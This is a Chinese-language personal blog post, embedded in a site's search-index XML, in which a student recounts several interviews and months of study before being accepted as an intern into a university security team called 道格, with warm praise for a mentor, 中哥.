    <content type="html"><![CDATA[<h1 id="记录进入道格的那些事"><a href="#记录进入道格的那些事" class="headerlink" title="记录进入道格的那些事"></a>记录进入道格的那些事</h1><p>由于换了电脑，每次给中哥交报告的时候，中哥都会说做个图床吧。害，之前的截图不见了（自己又去截图了下）。</p><p>有一说一感觉进道格有个手就行（可能神经有点不正常emmmm~~），但是没想到这一路过来这么坎坷。</p><h2 id="第一次面试"><a href="#第一次面试" class="headerlink" title="第一次面试"></a>第一次面试</h2><p>在第一次面试之前，已经水了一个学期了。我一直觉得我跟大二的学生一个水平（蜜汁自信），后来发现大二的学生都是可以自主分析pop链了，而我还沉迷在基本漏洞。然后第一次面试，在开学的那几天，然后第一次遇见中哥，进行了开开心心的面试（中哥太友好了，跟他的正经不匹配）。当然这第一次也没有正式进入道格。但是被夸了基础好，不知道是鼓励的话还是什么话。然后学学java，然后就步入了漫长的学习。中哥对熊海的评价，后面想了一晚上，第二天跟中哥深深的交流了一下。做好决定认真学！</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/%E4%B8%AD%E5%93%A53.png" alt="中哥3"></p><h2 id="第二次面试"><a href="#第二次面试" class="headerlink" title="第二次面试"></a>第二次面试</h2><p>终于经历了1个半月的学习java，再一次来面试。我信心十足，也许我才20岁，对任何事都是充满了信心。我再一次觉得我肯定能进道格了。面试也不错，中哥也说我进度跟的不错，但是他尽然让我自我介绍一下！！！！（必须吐槽一下）人都给我整傻了。结束的时候他说，要团队商量下。害~~，我这自信再一次被打击。不过这次的打击跟上一次不同，我感觉在逗我玩呢。但是没办法确实实力不足，也许我会的跟大二的一样多，pop链我也可以信手沾来，中哥就不会一而再的犹豫~，不过他一如既往的好，让我当了个道格实习成员。（我怀疑这是史无前例的），然后进入最终考核，挖洞！我以前想都不敢想。记得第一次面试之前，中哥让我审计熊海cms我当时候，看到那么多的代码，真的是傻乎乎，无从下手。忘记说了！是那个道格管理员说他叫陈嘉莉！！！我一直以为是个学姐，还是个温柔的学姐！！后来才知道是个男生！</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/%E4%B8%AD%E5%93%A52.png" alt="中哥2"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/%E4%B8%AD%E5%93%A5.png" alt="中哥"></p><h2 id="继一、二次面试感受"><a href="#继一、二次面试感受" class="headerlink" title="继一、二次面试感受"></a>继一、二次面试感受</h2><p>前前后后一个半月吧。给我的最大感受就是，学习信安的这条路上要少走弯路，但是不要怕走弯路，二者都可以给你同等的成长。谢谢在我的大二上的这学期，让我碰到中哥。</p><p>他还不把学习资料让我白嫖，至今我还是不能理解为什么！！！也许后面我会懂~~~是不是他觉得太便宜了。200可以跟女朋友撸管两次了。</p><p>学技术路上碰到这样一位恩师？哈哈哈哈哈我觉得肯定是能够算的上我师父的，学习路上让我少打点王者，问问题也会抽空回答我。太爱了！！！</p><p>前前后后还有很多事。有些太麻烦了，就懒得说了。害~~，希望我未来的道路上，能够遇到很多中哥这样的人！好好做好接下来的任务….马上就要进入道格了！坚持！</p><h2 id="第三次面试"><a href="#第三次面试" class="headerlink" title="第三次面试"></a>第三次面试</h2><p>太久了，忘记了哈哈哈哈~~</p><h2 id="最后一次"><a href="#最后一次" class="headerlink" title="最后一次"></a>最后一次</h2><p>中哥太忙了。结果是别的师傅面试的。（说实话自己不应该进道格的，但是给了我这个机会，就好好把握住。<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220224203017.png" alt="QQ截图20220224203017"></p><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>历程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>历程</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
